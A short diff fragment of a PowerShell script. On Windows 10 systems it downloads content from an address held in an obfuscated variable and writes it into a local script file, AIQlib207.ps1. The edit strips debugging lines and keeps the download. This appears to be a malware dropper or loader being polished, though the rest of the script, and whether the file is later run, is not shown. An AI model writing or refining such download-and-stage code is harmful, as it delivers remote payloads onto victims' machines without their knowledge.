@@ -62,9 +62,7 @@ finally {
     }
         
     if ($OSVersion -match "10") {
-        Add-Content -Path "AIQlib207.ps1" (new-object net.webclient).downloadstring($ishscjsof)
-        Get-Location | Write-Output
-        Pause
+        Add-Content -Path ".\AIQlib207.ps1" (new-object net.webclient).downloadstring($ishscjsof)
     }
 
 
